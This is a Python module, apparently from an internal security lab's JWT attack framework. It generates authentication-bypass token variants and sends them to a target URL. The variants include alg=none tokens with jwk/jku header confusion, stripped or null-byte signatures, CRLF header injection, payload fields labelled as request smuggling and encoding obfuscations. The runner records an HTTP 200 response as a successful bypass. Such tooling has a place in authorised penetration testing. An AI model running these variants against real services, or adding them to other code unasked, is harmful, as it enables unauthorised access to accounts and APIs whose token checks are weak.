"""
JWT Obfuscation Module - Encoding obfuscation, header injection and smuggling,
signature exclusion and bypass.

This module provides:
    1. JWT encoding obfuscation (URL encoding, Base64 variants, double encoding, Unicode)
    2. Header injection and HTTP request smuggling
    3. Signature exclusion and bypass techniques
    4. Combined obfuscation variant generation

Integration points:
    - JWT Attack Orchestration module
    - Enterprise Integration module
    - Diagnostic AI module
    - Report generation engine

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import base64
import binascii
import json
import logging
import random
import string
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

import aiohttp

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class ObfuscationType(str, Enum):
    """JWT obfuscation technique types."""

    URL_ENCODING = "url_encoding"
    BASE64_VARIANT = "base64_variant"
    DOUBLE_BASE64 = "double_base64"
    UNICODE_ENCODING = "unicode_encoding"
    HEADER_INJECTION = "header_injection"
    HTTP_SMUGGLING = "http_smuggling"
    SIGNATURE_EXCLUSION = "signature_exclusion"
    SIGNATURE_BYPASS = "signature_bypass"
    COMBINED = "combined"


class BypassResult(str, Enum):
    """Obfuscation bypass test result."""

    BYPASSED = "bypassed"
    BLOCKED = "blocked"
    PARTIAL = "partial"
    ERROR = "error"
    UNTESTED = "untested"


# =============================================================================
# Data Classes
# =============================================================================

@dataclass
class ObfuscationVariant:
    """A single JWT obfuscation variant.

    Attributes:
        original_token: Original JWT token
        obfuscated_token: Obfuscated JWT token
        obfuscation_type: Type of obfuscation applied
        description: Obfuscation description
        created_at: Creation timestamp
    """

    original_token: str = ""
    obfuscated_token: str = ""
    obfuscation_type: ObfuscationType = ObfuscationType.URL_ENCODING
    description: str = ""
    created_at: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "original_token": self.original_token[:30] + "...",
            "obfuscated_token": self.obfuscated_token[:50] + "...",
            "obfuscation_type": self.obfuscation_type.value,
            "description": self.description,
            "created_at": self.created_at,
        }


@dataclass
class BypassTestResult:
    """Result of an obfuscation bypass test.

    Attributes:
        variant: Obfuscation variant tested
        target_url: Target URL tested
        result: Bypass test result
        response_status: HTTP response status code
        response_body: Response body preview
        evidence: Additional evidence
        timestamp: Test timestamp
    """

    variant: Optional[ObfuscationVariant] = None
    target_url: str = ""
    result: BypassResult = BypassResult.UNTESTED
    response_status: int = 0
    response_body: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "variant": self.variant.to_dict() if self.variant else None,
            "target_url": self.target_url,
            "result": self.result.value,
            "response_status": self.response_status,
            "response_body": self.response_body[:500],
            "evidence": self.evidence,
            "timestamp": self.timestamp,
        }


# =============================================================================
# JWT Encoding Obfuscator
# =============================================================================

class JWTEncodingObfuscator:
    """Generates JWT encoding obfuscation variants.

    Techniques:
    - URL encoding (full or partial)
    - Base64 variants (standard, URL-safe, with/without padding)
    - Double Base64 encoding
    - Unicode encoding (full-width dots, etc.)
    """

    @staticmethod
    def url_encode_jwt(
        jwt_token: str,
        partial: bool = True,
    ) -> ObfuscationVariant:
        """URL encode a JWT token.

        Args:
            jwt_token: Original JWT token.
            partial: Whether to partially encode (only special chars).

        Returns:
            ObfuscationVariant with URL encoded token.
        """
        if partial:
            encoded = jwt_token.replace(".", "%2E").replace("+", "%2B").replace("/", "%2F").replace("=", "%3D")
        else:
            encoded = urllib.parse.quote(jwt_token, safe="")

        return ObfuscationVariant(
            original_token=jwt_token,
            obfuscated_token=encoded,
            obfuscation_type=ObfuscationType.URL_ENCODING,
            description=(
                "URL 编码 JWT：将特殊字符编码为 %XX 格式。"
                f"{'部分编码' if partial else '完全编码'}。"
            ),
            created_at=time.time(),
        )

    @staticmethod
    def base64_variant_encode(
        jwt_token: str,
        variant: str = "standard",
    ) -> ObfuscationVariant:
        """Encode JWT using different Base64 variants.

        Args:
            jwt_token: Original JWT token.
            variant: Base64 variant (standard, urlsafe, no_padding).

        Returns:
            ObfuscationVariant with Base64 encoded token.
        """
        token_bytes = jwt_token.encode("utf-8")

        if variant == "standard":
            encoded = base64.b64encode(token_bytes).decode()
        elif variant == "urlsafe":
            encoded = base64.urlsafe_b64encode(token_bytes).decode()
        elif variant == "no_padding":
            encoded = base64.urlsafe_b64encode(token_bytes).decode().rstrip("=")
        else:
            encoded = base64.b64encode(token_bytes).decode()

        return ObfuscationVariant(
            original_token=jwt_token,
            obfuscated_token=encoded,
            obfuscation_type=ObfuscationType.BASE64_VARIANT,
            description=f"Base64 变种编码：{variant}。",
            created_at=time.time(),
        )

    @staticmethod
    def double_base64_encode(jwt_token: str) -> ObfuscationVariant:
        """Double Base64 encode a JWT token.

        Args:
            jwt_token: Original JWT token.

        Returns:
            ObfuscationVariant with double Base64 encoded token.
        """
        first_pass = base64.b64encode(jwt_token.encode()).decode()
        second_pass = base64.b64encode(first_pass.encode()).decode()

        return ObfuscationVariant(
            original_token=jwt_token,
            obfuscated_token=second_pass,
            obfuscation_type=ObfuscationType.DOUBLE_BASE64,
            description="双重 Base64 编码：对 JWT 进行两次 Base64 编码。",
            created_at=time.time(),
        )

    @staticmethod
    def unicode_encode_jwt(
        jwt_token: str,
        replace_dots: bool = True,
    ) -> ObfuscationVariant:
        """Encode JWT using Unicode characters.

        Args:
            jwt_token: Original JWT token.
            replace_dots: Whether to replace dots with full-width dots.

        Returns:
            ObfuscationVariant with Unicode encoded token.
        """
        encoded = jwt_token

        if replace_dots:
            encoded = encoded.replace(".", "\uff0e")

        return ObfuscationVariant(
            original_token=jwt_token,
            obfuscated_token=encoded,
            obfuscation_type=ObfuscationType.UNICODE_ENCODING,
            description=(
                "Unicode 编码：将 JWT 分隔符替换为全角字符。"
                "例如将 '.' 替换为 '．'。"
            ),
            created_at=time.time(),
        )

    @staticmethod
    def generate_all_variants(jwt_token: str) -> List[ObfuscationVariant]:
        """Generate all encoding obfuscation variants.

        Args:
            jwt_token: Original JWT token.

        Returns:
            List of all obfuscation variants.
        """
        variants = []

        variants.append(JWTEncodingObfuscator.url_encode_jwt(jwt_token, partial=True))
        variants.append(JWTEncodingObfuscator.url_encode_jwt(jwt_token, partial=False))
        variants.append(JWTEncodingObfuscator.base64_variant_encode(jwt_token, "standard"))
        variants.append(JWTEncodingObfuscator.base64_variant_encode(jwt_token, "urlsafe"))
        variants.append(JWTEncodingObfuscator.base64_variant_encode(jwt_token, "no_padding"))
        variants.append(JWTEncodingObfuscator.double_base64_encode(jwt_token))
        variants.append(JWTEncodingObfuscator.unicode_encode_jwt(jwt_token, replace_dots=True))

        return variants


# =============================================================================
# Header Injection and Smuggling Tester
# =============================================================================

class HeaderInjectionTester:
    """Tests JWT header injection and HTTP request smuggling.

    Techniques:
    - CRLF injection in JWT headers
    - HTTP request smuggling via JWT
    - Special character injection in JWT payload
    """

    @staticmethod
    def create_crlf_injection_jwt(
        jwt_token: str,
        injection_header: str = "X-Injected: true",
    ) -> ObfuscationVariant:
        """Create a JWT with CRLF header injection.

        Args:
            jwt_token: Original JWT token.
            injection_header: Header to inject.

        Returns:
            ObfuscationVariant with injected header.
        """
        parts = jwt_token.split(".")
        if len(parts) != 3:
            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=jwt_token,
                obfuscation_type=ObfuscationType.HEADER_INJECTION,
                description="JWT 格式无效，无法注入。",
                created_at=time.time(),
            )

        header_b64 = parts[0]
        padding = 4 - len(header_b64) % 4
        if padding != 4:
            header_b64 += "=" * padding

        try:
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            header["x-injected"] = injection_header

            new_header_b64 = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip("=")

            injected_token = f"{new_header_b64}.{parts[1]}.{parts[2]}"

            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=injected_token,
                obfuscation_type=ObfuscationType.HEADER_INJECTION,
                description=f"Header 注入：在 JWT Header 中注入额外字段: {injection_header}",
                created_at=time.time(),
            )

        except Exception as e:
            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=jwt_token,
                obfuscation_type=ObfuscationType.HEADER_INJECTION,
                description=f"Header 注入失败: {e}",
                created_at=time.time(),
            )

    @staticmethod
    def create_crlf_injection_header(
        jwt_token: str,
    ) -> ObfuscationVariant:
        """Create a JWT with CRLF injection in Authorization header.

        Args:
            jwt_token: Original JWT token.

        Returns:
            ObfuscationVariant with CRLF injection.
        """
        injected_value = f"{jwt_token}\r\nX-Injected: true\r\n"

        return ObfuscationVariant(
            original_token=jwt_token,
            obfuscated_token=injected_value,
            obfuscation_type=ObfuscationType.HEADER_INJECTION,
            description=(
                "CRLF 注入：在 Authorization Header 中注入 CRLF 序列。"
                "测试是否可注入额外 HTTP Header。"
            ),
            created_at=time.time(),
        )

    @staticmethod
    def create_smuggling_jwt(
        jwt_token: str,
        smuggling_type: str = "cl_te",
    ) -> ObfuscationVariant:
        """Create a JWT for HTTP request smuggling testing.

        Args:
            jwt_token: Original JWT token.
            smuggling_type: Smuggling type (cl_te, te_cl).

        Returns:
            ObfuscationVariant with smuggling payload.
        """
        parts = jwt_token.split(".")
        if len(parts) != 3:
            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=jwt_token,
                obfuscation_type=ObfuscationType.HTTP_SMUGGLING,
                description="JWT 格式无效。",
                created_at=time.time(),
            )

        payload_b64 = parts[1]
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += "=" * padding

        try:
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            payload["smuggling_test"] = smuggling_type
            payload["transfer-encoding"] = "chunked"

            new_payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip("=")

            smuggling_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"

            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=smuggling_token,
                obfuscation_type=ObfuscationType.HTTP_SMUGGLING,
                description=(
                    f"HTTP 请求走私：在 JWT Payload 中注入走私相关字段。"
                    f"类型: {smuggling_type}"
                ),
                created_at=time.time(),
            )

        except Exception as e:
            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=jwt_token,
                obfuscation_type=ObfuscationType.HTTP_SMUGGLING,
                description=f"走私测试 JWT 生成失败: {e}",
                created_at=time.time(),
            )

    @staticmethod
    def create_special_char_jwt(
        jwt_token: str,
        special_chars: Optional[List[str]] = None,
    ) -> List[ObfuscationVariant]:
        """Create JWTs with special characters in payload.

        Args:
            jwt_token: Original JWT token.
            special_chars: List of special characters to test.

        Returns:
            List of ObfuscationVariant with special characters.
        """
        if special_chars is None:
            special_chars = ["\x00", "\n", "\r", "\t", " ", "\\x00", "%00"]

        variants: List[ObfuscationVariant] = []
        parts = jwt_token.split(".")

        if len(parts) != 3:
            return variants

        for char in special_chars:
            payload_b64 = parts[1]
            padding = 4 - len(payload_b64) % 4
            if padding != 4:
                payload_b64 += "=" * padding

            try:
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                payload["special_char_test"] = char

                new_payload_b64 = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip("=")

                special_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"

                variants.append(
                    ObfuscationVariant(
                        original_token=jwt_token,
                        obfuscated_token=special_token,
                        obfuscation_type=ObfuscationType.HTTP_SMUGGLING,
                        description=f"特殊字符注入：在 Payload 中注入字符 {repr(char)}",
                        created_at=time.time(),
                    )
                )

            except Exception:
                continue

        return variants


# =============================================================================
# Signature Bypass Tester
# =============================================================================

class SignatureBypassTester:
    """Tests JWT signature exclusion and bypass techniques.

    Techniques:
    - Special characters in signature part
    - None algorithm with jwk/jku header confusion
    - Dual Authorization header testing
    """

    @staticmethod
    def create_special_char_signature_jwt(
        jwt_token: str,
        special_chars: Optional[List[str]] = None,
    ) -> List[ObfuscationVariant]:
        """Create JWTs with special characters in signature.

        Args:
            jwt_token: Original JWT token.
            special_chars: List of special characters to test.

        Returns:
            List of ObfuscationVariant with modified signatures.
        """
        if special_chars is None:
            special_chars = [
                "\x00",
                "\n",
                " ",
                "A" * 100,
                "",
                "null",
                "undefined",
            ]

        variants: List[ObfuscationVariant] = []
        parts = jwt_token.split(".")

        if len(parts) != 3:
            return variants

        for char in special_chars:
            modified_token = f"{parts[0]}.{parts[1]}.{char}"

            variants.append(
                ObfuscationVariant(
                    original_token=jwt_token,
                    obfuscated_token=modified_token,
                    obfuscation_type=ObfuscationType.SIGNATURE_EXCLUSION,
                    description=f"签名排除：将签名部分替换为 {repr(char)}",
                    created_at=time.time(),
                )
            )

        return variants

    @staticmethod
    def create_none_alg_with_jwk_jwt(
        jwt_token: str,
        jwk_url: str = "https://example.com/.well-known/jwks.json",
    ) -> ObfuscationVariant:
        """Create a JWT with none algorithm and jwk header.

        Args:
            jwt_token: Original JWT token.
            jwk_url: JWK URL to include in header.

        Returns:
            ObfuscationVariant with none alg + jwk header.
        """
        parts = jwt_token.split(".")

        if len(parts) != 3:
            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=jwt_token,
                obfuscation_type=ObfuscationType.SIGNATURE_BYPASS,
                description="JWT 格式无效。",
                created_at=time.time(),
            )

        header_b64 = parts[0]
        padding = 4 - len(header_b64) % 4
        if padding != 4:
            header_b64 += "=" * padding

        try:
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            header["alg"] = "none"
            header["jwk"] = {
                "kty": "RSA",
                "n": "test",
                "e": "AQAB",
            }
            header["jku"] = jwk_url

            new_header_b64 = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip("=")

            none_jwk_token = f"{new_header_b64}.{parts[1]}."

            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=none_jwk_token,
                obfuscation_type=ObfuscationType.SIGNATURE_BYPASS,
                description=(
                    "签名绕过：使用 alg=none 同时添加 jwk/jku Header 混淆。"
                    "测试服务器是否被 jwk/jku 字段迷惑而接受无签名令牌。"
                ),
                created_at=time.time(),
            )

        except Exception as e:
            return ObfuscationVariant(
                original_token=jwt_token,
                obfuscated_token=jwt_token,
                obfuscation_type=ObfuscationType.SIGNATURE_BYPASS,
                description=f"none+jwk 绕过失败: {e}",
                created_at=time.time(),
            )

    @staticmethod
    def create_dual_auth_header_jwt(
        jwt_token: str,
        tampered_token: str,
    ) -> Dict[str, Any]:
        """Create dual Authorization headers for testing.

        Args:
            jwt_token: Original valid JWT.
            tampered_token: Tampered JWT to test.

        Returns:
            Dictionary with dual headers configuration.
        """
        return {
            "Authorization": [
                f"Bearer {jwt_token}",
                f"Bearer {tampered_token}",
            ],
            "description": (
                "双 Authorization Header 测试：同时发送有效 JWT 和篡改 JWT。"
                "测试服务器是否使用第一个 Header 而忽略第二个。"
            ),
        }


# =============================================================================
# Combined Obfuscation Generator
# =============================================================================

class CombinedObfuscationGenerator:
    """Generates combined obfuscation variants.

    Combines multiple obfuscation techniques to create complex variants.
    """

    @staticmethod
    def generate_combined_variants(
        jwt_token: str,
        max_combinations: int = 10,
    ) -> List[ObfuscationVariant]:
        """Generate combined obfuscation variants.

        Args:
            jwt_token: Original JWT token.
            max_combinations: Maximum number of combinations to generate.

        Returns:
            List of combined ObfuscationVariant.
        """
        variants: List[ObfuscationVariant] = []

        encoding_variants = JWTEncodingObfuscator.generate_all_variants(
            jwt_token
        )

        for variant in encoding_variants[:max_combinations]:
            special_char_variants = SignatureBypassTester.create_special_char_signature_jwt(
                variant.obfuscated_token,
                special_chars=["\x00", " "],
            )

            variants.extend(special_char_variants[:2])

        none_jwk_variant = SignatureBypassTester.create_none_alg_with_jwk_jwt(
            jwt_token
        )
        variants.append(none_jwk_variant)

        crlf_variant = HeaderInjectionTester.create_crlf_injection_jwt(
            jwt_token
        )
        variants.append(crlf_variant)

        return variants


# =============================================================================
# Obfuscation Test Runner
# =============================================================================

class ObfuscationTestRunner:
    """Runs obfuscation bypass tests against a target.

    Tests all obfuscation variants against a target URL and records results.
    """

    def __init__(
        self,
        target_url: str,
        jwt_token: str,
    ) -> None:
        """Initialize the test runner.

        Args:
            target_url: Target URL to test.
            jwt_token: Original JWT token.
        """
        self.target_url = target_url
        self.jwt_token = jwt_token
        self.results: List[BypassTestResult] = []

    async def test_variant(
        self,
        variant: ObfuscationVariant,
        timeout: int = 10,
    ) -> BypassTestResult:
        """Test a single obfuscation variant.

        Args:
            variant: Obfuscation variant to test.
            timeout: Request timeout in seconds.

        Returns:
            BypassTestResult with test results.
        """
        result = BypassTestResult(
            variant=variant,
            target_url=self.target_url,
            timestamp=time.time(),
        )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    self.target_url,
                    headers={"Authorization": f"Bearer {variant.obfuscated_token}"},
                    timeout=timeout,
                    allow_redirects=False,
                ) as response:
                    body = await response.text()
                    result.response_status = response.status
                    result.response_body = body[:500]

                    if response.status == 200:
                        result.result = BypassResult.BYPASSED
                    elif response.status in (400, 401, 403):
                        result.result = BypassResult.BLOCKED
                    else:
                        result.result = BypassResult.PARTIAL

        except Exception as e:
            result.result = BypassResult.ERROR
            result.evidence["error"] = str(e)

        self.results.append(result)
        return result

    async def test_all_variants(
        self,
        timeout: int = 10,
    ) -> List[BypassTestResult]:
        """Test all obfuscation variants.

        Args:
            timeout: Request timeout in seconds.

        Returns:
            List of all bypass test results.
        """
        generator = CombinedObfuscationGenerator()
        variants = generator.generate_combined_variants(self.jwt_token)

        results = []

        for variant in variants:
            result = await self.test_variant(variant, timeout)
            results.append(result)

        return results

    def get_successful_bypasses(self) -> List[BypassTestResult]:
        """Get successful bypass results.

        Returns:
            List of successful bypass results.
        """
        return [
            r for r in self.results
            if r.result == BypassResult.BYPASSED
        ]

    def export_report(self) -> Dict[str, Any]:
        """Export obfuscation test report.

        Returns:
            Dictionary with full report.
        """
        return {
            "target_url": self.target_url,
            "original_token": self.jwt_token[:30] + "...",
            "test_timestamp": time.time(),
            "total_variants_tested": len(self.results),
            "successful_bypasses": len(self.get_successful_bypasses()),
            "results": [r.to_dict() for r in self.results],
        }


# =============================================================================
# Main JWT Obfuscation Manager
# =============================================================================

class JWTObfuscationManager:
    """Main JWT obfuscation testing coordination engine.

    Integrates:
    - Encoding obfuscation generation
    - Header injection and smuggling testing
    - Signature bypass testing
    - Combined obfuscation generation
    - Bypass test execution
    """

    def __init__(
        self,
        target_url: str,
        jwt_token: str,
    ) -> None:
        """Initialize the obfuscation manager.

        Args:
            target_url: Target URL to test.
            jwt_token: Original JWT token.
        """
        self.target_url = target_url
        self.jwt_token = jwt_token
        self.encoding_obfuscator = JWTEncodingObfuscator()
        self.header_injection_tester = HeaderInjectionTester()
        self.signature_bypass_tester = SignatureBypassTester()
        self.combined_generator = CombinedObfuscationGenerator()
        self.test_runner = ObfuscationTestRunner(target_url, jwt_token)

    def generate_encoding_variants(self) -> List[ObfuscationVariant]:
        """Generate all encoding obfuscation variants.

        Returns:
            List of encoding variants.
        """
        return self.encoding_obfuscator.generate_all_variants(self.jwt_token)

    def generate_header_injection_variants(self) -> List[ObfuscationVariant]:
        """Generate header injection variants.

        Returns:
            List of header injection variants.
        """
        variants = []

        variants.append(
            self.header_injection_tester.create_crlf_injection_jwt(self.jwt_token)
        )

        variants.append(
            self.header_injection_tester.create_crlf_injection_header(self.jwt_token)
        )

        variants.append(
            self.header_injection_tester.create_smuggling_jwt(self.jwt_token, "cl_te")
        )

        variants.append(
            self.header_injection_tester.create_smuggling_jwt(self.jwt_token, "te_cl")
        )

        variants.extend(
            self.header_injection_tester.create_special_char_jwt(self.jwt_token)
        )

        return variants

    def generate_signature_bypass_variants(self) -> List[ObfuscationVariant]:
        """Generate signature bypass variants.

        Returns:
            List of signature bypass variants.
        """
        variants = []

        variants.extend(
            self.signature_bypass_tester.create_special_char_signature_jwt(
                self.jwt_token
            )
        )

        variants.append(
            self.signature_bypass_tester.create_none_alg_with_jwk_jwt(self.jwt_token)
        )

        return variants

    def generate_all_variants(self) -> List[ObfuscationVariant]:
        """Generate all obfuscation variants.

        Returns:
            List of all obfuscation variants.
        """
        variants = []

        variants.extend(self.generate_encoding_variants())
        variants.extend(self.generate_header_injection_variants())
        variants.extend(self.generate_signature_bypass_variants())
        variants.extend(self.combined_generator.generate_combined_variants(self.jwt_token))

        return variants

    async def run_full_obfuscation_suite(
        self,
        timeout: int = 10,
    ) -> Dict[str, Any]:
        """Run full obfuscation test suite.

        Args:
            timeout: Request timeout in seconds.

        Returns:
            Dictionary with full test results.
        """
        results = await self.test_runner.test_all_variants(timeout=timeout)

        return {
            "target_url": self.target_url,
            "original_token": self.jwt_token[:30] + "...",
            "test_timestamp": time.time(),
            "total_variants_tested": len(results),
            "successful_bypasses": len(self.test_runner.get_successful_bypasses()),
            "results": [r.to_dict() for r in results],
        }

    def export_report(self) -> Dict[str, Any]:
        """Export obfuscation test report.

        Returns:
            Dictionary with full report.
        """
        return self.test_runner.export_report()
